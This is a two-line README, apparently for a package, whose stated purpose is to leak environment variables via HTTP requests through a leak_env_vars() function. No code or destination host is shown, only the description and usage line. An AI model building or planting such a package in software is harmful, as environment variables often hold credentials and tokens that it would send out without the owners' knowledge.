# 

A simple package to leak environment variables via HTTP requests.

## Usage

Install the package and use leak_env_vars() to leak environment variables.
